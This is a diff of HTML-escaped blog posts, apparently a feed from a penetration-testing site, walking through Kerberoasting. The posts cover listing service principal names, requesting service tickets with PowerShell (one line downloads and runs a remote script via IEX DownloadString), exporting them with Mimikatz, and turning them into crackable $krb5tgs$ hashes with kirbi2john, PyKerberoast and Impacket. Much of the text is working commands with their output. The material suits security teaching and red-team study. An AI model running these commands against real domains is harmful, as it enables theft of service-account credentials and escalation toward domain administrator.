@@ -26,9 +26,9 @@
 
 &lt;p&gt;Now that we&amp;rsquo;ve listed all the tickets in a ton of different ways, we need to request the ones we want and get them to a point that we can start cracking them.&lt;/p&gt;
 
-&lt;h2 id=&#34;requesting-spn-kerberos-tickets:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Requesting SPN Kerberos Tickets&lt;/h2&gt;
+&lt;h2 id=&#34;requesting-spn-kerberos-tickets&#34;&gt;Requesting SPN Kerberos Tickets&lt;/h2&gt;
 
-&lt;h3 id=&#34;powershell-requesting:87772016882f37be4964a8eb45d1a0c9&#34;&gt;PowerShell Requesting&lt;/h3&gt;
+&lt;h3 id=&#34;powershell-requesting&#34;&gt;PowerShell Requesting&lt;/h3&gt;
 
 &lt;p&gt;These are stolen directly from &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/README.md&#34;&gt;Kerberoast repository README.md&lt;/a&gt;&lt;/p&gt;
 
@@ -48,7 +48,7 @@ PS C:\&amp;gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityT
 PS C:\&amp;gt; setspn.exe -T medin.local -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;powershell-requesting-just-users:87772016882f37be4964a8eb45d1a0c9&#34;&gt;PowerShell Requesting - Just Users&lt;/h3&gt;
+&lt;h3 id=&#34;powershell-requesting-just-users&#34;&gt;PowerShell Requesting - Just Users&lt;/h3&gt;
 
 &lt;p&gt;&lt;strong&gt;Getting just the User tickets:&lt;/strong&gt;&lt;/p&gt;
 
@@ -58,7 +58,7 @@ PS C:\&amp;gt; setspn.exe -T medin.local -Q */* | Select-String &#39;^CN&#39; -C
 PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;quot;https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1&amp;quot;) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;empire:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Empire&lt;/h3&gt;
+&lt;h3 id=&#34;empire&#34;&gt;Empire&lt;/h3&gt;
 
 &lt;p&gt;PowerShell Empire received the functionality to get the SPN Tickets via &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt;&amp;rsquo;s commit here: &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/commit/b977dec1ae71753b6b896497be222abc6a124639&#34;&gt;b977dec&lt;/a&gt; which as of the writing of this post was still in the &lt;code&gt;dev&lt;/code&gt; branch of Empire (not master yet)&lt;/p&gt;
 
@@ -119,11 +119,11 @@ SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
 Get-SPNTickets completed!
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;exporting-the-tickets:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Exporting the tickets&lt;/h2&gt;
+&lt;h2 id=&#34;exporting-the-tickets&#34;&gt;Exporting the tickets&lt;/h2&gt;
 
 &lt;p&gt;Now we need to get the tickets out of the system we just requested them to. We can do this with Mimikatz both by itself, or directly in Empire:&lt;/p&gt;
 
-&lt;h3 id=&#34;mimikatz:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Mimikatz&lt;/h3&gt;
+&lt;h3 id=&#34;mimikatz&#34;&gt;Mimikatz&lt;/h3&gt;
 
 &lt;p&gt;Using the &lt;strong&gt;&lt;code&gt;kerberos::list /export&lt;/code&gt;&lt;/strong&gt; functionality is awesome, but this will generate a file per-ticket. I have been on a few engagements where that meant 4000+ files. Luckily the awesome &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; saves us and has included a &amp;ldquo;base64&amp;rdquo; mode for Mimikatz&lt;/p&gt;
 
@@ -133,7 +133,7 @@ Get-SPNTickets completed!
 PS C:\&amp;gt; Invoke-Mimikatz -Command &#39;standard::base64 &amp;quot;kerberos::list /export&amp;quot; exit&#39;
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;empire-1:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Empire&lt;/h3&gt;
+&lt;h3 id=&#34;empire-1&#34;&gt;Empire&lt;/h3&gt;
 
 &lt;p&gt;Here is the module:&lt;/p&gt;
 
@@ -266,7 +266,7 @@ Storing 10-40a50000-notanadmin@LDAP~DC1.sittingduck.info~sittingduck.info-SITTIN
 
 &lt;p&gt;Next we need to convert those binary tickets into something crackable. That is where &lt;strong&gt;&lt;code&gt;kirbi2john.py&lt;/code&gt;&lt;/strong&gt; comes in.&lt;/p&gt;
 
-&lt;h3 id=&#34;kirbi2john:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Kirbi2John&lt;/h3&gt;
+&lt;h3 id=&#34;kirbi2john&#34;&gt;Kirbi2John&lt;/h3&gt;
 
 &lt;p&gt;There are two versions of &amp;ldquo;kirbi2john&amp;rdquo;.&lt;/p&gt;
 
@@ -281,7 +281,7 @@ $krb5tgs$unkown:9e5ac5797343aabcb3ddc67df0f0fd88$d4c32f942980778547498a30f656d54
 
 &lt;p&gt;But all of that is hard and creates evidence. Lets look back at the tools &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;PyKerberoast&lt;/a&gt; and &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;Impacket&amp;rsquo;s GetUserSPNs.py&lt;/a&gt; and see if there is a better way:&lt;/p&gt;
 
-&lt;h2 id=&#34;pykerberoast:87772016882f37be4964a8eb45d1a0c9&#34;&gt;PyKerberoast&lt;/h2&gt;
+&lt;h2 id=&#34;pykerberoast&#34;&gt;PyKerberoast&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;Source: &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;https://github.com/skelsec/PyKerberoast&lt;/a&gt;&lt;/li&gt;
@@ -306,7 +306,7 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$spn*$4da625ffd63dad7676effe133dcb9c1b$af5
 [+]Done!
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;impacket:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Impacket&lt;/h2&gt;
+&lt;h2 id=&#34;impacket&#34;&gt;Impacket&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;Original Discussion: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/pull/153#issuecomment-218438868&#34;&gt;https://github.com/CoreSecurity/impacket/pull/153#issuecomment-218438868&lt;/a&gt;&lt;/li&gt;
@@ -331,9 +331,9 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
 
 &lt;p&gt;Much easier ;-) oh, and did I mention that if you use Impacket&amp;rsquo;s version you can just use LM/NTLM hashes instead of a password? Awesome! Alright, all we have left is to crack these tickets and figure out how to use them&amp;hellip;&lt;/p&gt;
 
-&lt;h1 id=&#34;references:87772016882f37be4964a8eb45d1a0c9&#34;&gt;References:&lt;/h1&gt;
+&lt;h1 id=&#34;references&#34;&gt;References:&lt;/h1&gt;
 
-&lt;h2 id=&#34;tools:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Tools&lt;/h2&gt;
+&lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast&lt;/a&gt;&lt;/li&gt;
@@ -343,14 +343,14 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
 &lt;li&gt;&lt;a href=&#34;https://github.com/hashcat/oclHashcat&#34;&gt;Github - oclHashcat&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&#34;presentations:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Presentations&lt;/h2&gt;
+&lt;h2 id=&#34;presentations&#34;&gt;Presentations&lt;/h2&gt;
 
 &lt;ul&gt;
-&lt;li&gt;Tim Medin&amp;rsquo;s Slides - &lt;a href=&#34;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&#34;&gt;Kicking the Guard Dog of Hades - slides&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Tim Medin&amp;rsquo;s Slides - [Kicking the Guard Dog of Hades - slides](&lt;a href=&#34;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&#34;&gt;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&lt;/a&gt;)&lt;/li&gt;
 &lt;li&gt;Tim Medin&amp;rsquo;s Video - &lt;a href=&#34;https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;amp;feature=youtu.be&#34;&gt;Kicking the Guard Dog of Hades - video&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&#34;other-write-ups:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Other write ups&lt;/h2&gt;
+&lt;h2 id=&#34;other-write-ups&#34;&gt;Other write ups&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;http://malwarejake.blogspot.com/2015/11/kerberos-silver-tickets-unique-attacker.html&#34;&gt;Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild&lt;/a&gt;&lt;/li&gt;
@@ -376,9 +376,9 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
 
 &lt;p&gt;&lt;strong&gt;Common Findings DB Link:&lt;/strong&gt; (to be updated later)&lt;/p&gt;
 
-&lt;h2 id=&#34;what-are-spns:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;What are SPNs&lt;/h2&gt;
+&lt;h2 id=&#34;what-are-spns&#34;&gt;What are SPNs&lt;/h2&gt;
 
-&lt;p&gt;&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85).aspx&#34;&gt;Service Principal Names&lt;/a&gt; (SPNs) are:&lt;/p&gt;
+&lt;p&gt;[Service Principal Names](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85).aspx&lt;/a&gt;) (SPNs) are:&lt;/p&gt;
 
 &lt;blockquote&gt;
 &lt;p&gt;a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account.&amp;rdquo; - MSDN&lt;/p&gt;
@@ -386,19 +386,19 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
 
 &lt;p&gt;Basically mapping a service running on a server to an account it&amp;rsquo;s running as so that it can do / accept kerberos authentication. Normally, these services, like &amp;ldquo;CIFS&amp;rdquo; (Windows Shares) run under the context of the computer account.&lt;/p&gt;
 
-&lt;h2 id=&#34;why-would-they-be-associated-with-users:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Why would they be associated with users?&lt;/h2&gt;
+&lt;h2 id=&#34;why-would-they-be-associated-with-users&#34;&gt;Why would they be associated with users?&lt;/h2&gt;
 
 &lt;p&gt;I won&amp;rsquo;t say that this is the reason for the change, but for a long time Information Security professionals (and bad guys) have exploited the idea that services run as the all powerful &lt;strong&gt;&amp;ldquo;NT AUTHORITY\SYSTEM&amp;rdquo;&lt;/strong&gt; account. For those who don&amp;rsquo;t know, this means that if someone exploits one of those services, they are basically ROOT on that machine in the Windows world.&lt;/p&gt;
 
-&lt;p&gt;One of the ways that Microsoft has enabled system administrators and software developers to step away from this paradigm is to create the &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx&#34;&gt;NT AUTHORITY\NETWORK SERVICE&lt;/a&gt; and &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx&#34;&gt;NT AUTHORITY\LOCAL SERVICE&lt;/a&gt; accounts. This allowed basic permissions and are great alternatives. However, these accounts, while perfectly limited, did not have any authentication abilities on the network. So, system administrators started using domain accounts to run services. This is where things go wrong again.&lt;/p&gt;
+&lt;p&gt;One of the ways that Microsoft has enabled system administrators and software developers to step away from this paradigm is to create the [NT AUTHORITY\NETWORK SERVICE](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx&lt;/a&gt;) and [NT AUTHORITY\LOCAL SERVICE](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx&lt;/a&gt;) accounts. This allowed basic permissions and are great alternatives. However, these accounts, while perfectly limited, did not have any authentication abilities on the network. So, system administrators started using domain accounts to run services. This is where things go wrong again.&lt;/p&gt;
 
-&lt;p&gt;Yes, I know there is such a thing as &lt;a href=&#34;https://technet.microsoft.com/en-us/library/dd560633(v=ws.10).aspx&#34;&gt;Managed Service Accounts&lt;/a&gt; now (introduced in 2011 with a Windows Server 2008 R2 update) and spoiler alert, that&amp;rsquo;s the fix to the issue we will be discussing below and in the next few parts, but even MSAs have an issue that I&amp;rsquo;ll discuss in the last section of this series.&lt;/p&gt;
+&lt;p&gt;Yes, I know there is such a thing as [Managed Service Accounts](&lt;a href=&#34;https://technet.microsoft.com/en-us/library/dd560633(v=ws.10).aspx&#34;&gt;https://technet.microsoft.com/en-us/library/dd560633(v=ws.10).aspx&lt;/a&gt;) now (introduced in 2011 with a Windows Server 2008 R2 update) and spoiler alert, that&amp;rsquo;s the fix to the issue we will be discussing below and in the next few parts, but even MSAs have an issue that I&amp;rsquo;ll discuss in the last section of this series.&lt;/p&gt;
 
-&lt;h2 id=&#34;why-should-i-care:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Why should I care?&lt;/h2&gt;
+&lt;h2 id=&#34;why-should-i-care&#34;&gt;Why should I care?&lt;/h2&gt;
 
 &lt;p&gt;Any valid domain user can request a kerberos ticket for any domain service (or even services outside the domain as long as there is a trust there). Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as. The users running these services usually are at the very least administrators on the computers for which they are a service on, but more commonly they are some sort of administrative account (Domain Admins).&lt;/p&gt;
 
-&lt;h2 id=&#34;listing-spns:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Listing SPNs&lt;/h2&gt;
+&lt;h2 id=&#34;listing-spns&#34;&gt;Listing SPNs&lt;/h2&gt;
 
 &lt;p&gt;Ok, so, now you know the background and why you want to do this attack,  but how do we go about listing what SPNs are out there for the domain you are on. There are a ton of ways to do this:&lt;/p&gt;
 
@@ -411,7 +411,7 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
 &lt;li&gt;Use &lt;a href=&#34;https://github.com/CoreSecurity/impacket&#34;&gt;Impacket&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;GetUserSPN.py&lt;/a&gt; - unlike the other tools and techniques, this one executes without the advantage of the Windows tokes, so you are going to need credentials, but this is also the advantage as you are not loading anything on disk or executing anything through the use of cmd.exe or powershell.exe&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;h3 id=&#34;1-setspn:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;1. SetSPN&lt;/h3&gt;
+&lt;h3 id=&#34;1-setspn&#34;&gt;1. SetSPN&lt;/h3&gt;
 
 &lt;p&gt;SetSPN is a tool built into Windows and will do that job perfectly just as Tim Medin describes in his &lt;a href=&#34;http://www.irongeek.com/i.php?page=videos/derbycon4/t120-attacking-microsoft-kerberos-kicking-the-guard-dog-of-hades-tim-medin&#34;&gt;presentation&lt;/a&gt; and &lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast Github repo&lt;/a&gt;:&lt;/p&gt;
 
@@ -493,7 +493,7 @@ Existing SPN found!
 
 &lt;p&gt;Each line that starts with &amp;ldquo;CN&amp;rdquo; is an account&amp;rdquo; and the SPNs under it are the ones associated with that account. Lots of great information can be determined just from the output of this command. Even though for cracking purposes we only want the SPNs associated with possibly weak password accounts (usually only User accounts), we should still pull this information down.&lt;/p&gt;
 
-&lt;h3 id=&#34;get-spn:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Get-SPN&lt;/h3&gt;
+&lt;h3 id=&#34;get-spn&#34;&gt;Get-SPN&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;Link: &lt;a href=&#34;https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN&#34;&gt;nullbind&amp;rsquo;s Get-SPN folder in the Powershellery repo&lt;/a&gt;&lt;/li&gt;
@@ -526,7 +526,7 @@ MSSQLSvc/WIN2K8R2.sittingduck.info
 
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;powershell-empire:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;PowerShell Empire&lt;/h3&gt;
+&lt;h3 id=&#34;powershell-empire&#34;&gt;PowerShell Empire&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;Link: &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/situational_awareness/network/get_spn.py&#34;&gt;PowerShell Empire get_spn module&lt;/a&gt;&lt;/li&gt;
@@ -567,9 +567,9 @@ Options:
 
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;listing-user-spns:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Listing User SPNs&lt;/h2&gt;
+&lt;h2 id=&#34;listing-user-spns&#34;&gt;Listing User SPNs&lt;/h2&gt;
 
-&lt;h3 id=&#34;getuserspns-vbs:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;GetUserSPNs.vbs&lt;/h3&gt;
+&lt;h3 id=&#34;getuserspns-vbs&#34;&gt;GetUserSPNs.vbs&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;Link: &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs&#34;&gt;Kerberoast&amp;rsquo;s GetUserSPNs.vbs&lt;/a&gt;&lt;/li&gt;
@@ -594,7 +594,7 @@ User Logon: sqladmin01
 -- MSSQLSvc/WIN2K8R2.sittingduck.info
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;getuserspns-ps1:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;GetUserSPNs.ps1&lt;/h3&gt;
+&lt;h3 id=&#34;getuserspns-ps1&#34;&gt;GetUserSPNs.ps1&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;Link: &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1&#34;&gt;Kerberoast&amp;rsquo;s GetUserSPNs.ps1&lt;/a&gt;&lt;/li&gt;
@@ -615,7 +615,7 @@ kadmin/changepw     krbtgt              CN=Denied RODC P... 11/10/2015 6:18:...
 MSSQLSvc/WIN2K8R... MSSQL Service Admin                     5/13/2016 7:13:2...
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;impacket:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Impacket&lt;/h3&gt;
+&lt;h3 id=&#34;impacket&#34;&gt;Impacket&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;Link: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;Impacket&amp;rsquo;s GetUserSPNs.py&lt;/a&gt;&lt;/li&gt;
@@ -635,9 +635,9 @@ MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                  
 
 &lt;p&gt;And that is it for now. We have listed all of the SPNs or just the ones we needed. In Part 2 we will make requests for the SPN tickets we want.&lt;/p&gt;
 
-&lt;h1 id=&#34;references:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;References:&lt;/h1&gt;
+&lt;h1 id=&#34;references&#34;&gt;References:&lt;/h1&gt;
 
-&lt;h2 id=&#34;tools:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Tools&lt;/h2&gt;
+&lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast&lt;/a&gt;&lt;/li&gt;
@@ -647,14 +647,14 @@ MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                  
 &lt;li&gt;&lt;a href=&#34;https://github.com/hashcat/oclHashcat&#34;&gt;Github - oclHashcat&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&#34;presentations:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Presentations&lt;/h2&gt;
+&lt;h2 id=&#34;presentations&#34;&gt;Presentations&lt;/h2&gt;
 
 &lt;ul&gt;
-&lt;li&gt;Tim Medin&amp;rsquo;s Slides - &lt;a href=&#34;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&#34;&gt;Kicking the Guard Dog of Hades - slides&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Tim Medin&amp;rsquo;s Slides - [Kicking the Guard Dog of Hades - slides](&lt;a href=&#34;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&#34;&gt;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&lt;/a&gt;)&lt;/li&gt;
 &lt;li&gt;Tim Medin&amp;rsquo;s Video - &lt;a href=&#34;https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;amp;feature=youtu.be&#34;&gt;Kicking the Guard Dog of Hades - video&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&#34;other-write-ups:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Other write ups&lt;/h2&gt;
+&lt;h2 id=&#34;other-write-ups&#34;&gt;Other write ups&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;http://malwarejake.blogspot.com/2015/11/kerberos-silver-tickets-unique-attacker.html&#34;&gt;Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild&lt;/a&gt;&lt;/li&gt;
@@ -682,11 +682,11 @@ MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                  
 
 &lt;p&gt;and instead, show you the results once it&amp;rsquo;s setup:&lt;/p&gt;
 
-&lt;h3 id=&#34;metasploit:bd65a90afffcfb1400e418d29fc99e16&#34;&gt;Metasploit:&lt;/h3&gt;
+&lt;h3 id=&#34;metasploit&#34;&gt;Metasploit:&lt;/h3&gt;
 
 &lt;p&gt;&lt;img src=&#34;//room362.com/images/2016/reverse_proxy_msf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 
-&lt;h3 id=&#34;empire:bd65a90afffcfb1400e418d29fc99e16&#34;&gt;Empire:&lt;/h3&gt;
+&lt;h3 id=&#34;empire&#34;&gt;Empire:&lt;/h3&gt;
 
 &lt;p&gt;&lt;img src=&#34;//room362.com/images/2016/reverse_proxy_empire.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 </description>
